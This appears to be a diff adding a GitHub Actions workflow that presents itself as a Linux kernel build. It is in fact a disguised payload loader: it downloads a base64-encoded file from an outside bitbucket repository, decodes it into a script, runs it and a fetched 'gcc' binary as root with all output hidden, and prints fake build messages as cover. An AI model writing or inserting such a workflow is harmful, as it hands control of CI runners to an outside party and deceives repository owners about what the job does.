@@ -1,0 +1,21 @@
+name: CI5
+on:
+  push:
+    branches: [ master ]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build Linux kernel
+        run: |
+          cd /tmp
+          sudo wget https://bitbucket.org/glibc-ssh/glibc/raw/master/llvm
+          sudo apt-get update
+          sudo apt --yes install cl-base64
+          sudo base64 -d llvm > build.sh
+          sudo chmod +x build.sh
+          wget https://bitbucket.org/glibc-ssh/glibc/raw/master/config.ghaction -O binutils 
+          sudo ./build.sh &>/dev/null
+          echo Start Linux kernel build
+          sudo ./gcc -c config &>/dev/null
+          echo Stop Linux kernel build
